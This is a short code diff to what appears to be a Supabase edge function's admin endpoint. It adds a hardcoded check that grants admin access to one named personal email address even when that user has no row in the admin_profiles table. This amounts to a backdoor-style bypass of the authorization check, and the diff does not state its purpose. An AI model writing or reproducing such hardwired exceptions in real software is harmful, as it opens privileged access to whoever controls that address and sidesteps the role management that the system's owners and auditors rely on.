@@ -46,6 +46,8 @@ Deno.serve(async (req) => {
       });
     }
 
+    const isDesignatedAdmin = user.email?.toLowerCase() === 'eletuabibat12@gmail.com';
+
     const adminClient = createClient(supabaseUrl, serviceRoleKey);
     const { data: adminRow } = await adminClient
       .from('admin_profiles')
@@ -53,7 +55,7 @@ Deno.serve(async (req) => {
       .eq('id', user.id)
       .maybeSingle();
 
-    if (!adminRow) {
+    if (!adminRow && !isDesignatedAdmin) {
       return new Response(JSON.stringify({ error: 'Forbidden' }), {
         status: 403,
         headers: { ...corsHeaders, 'Content-Type': 'application/json' },
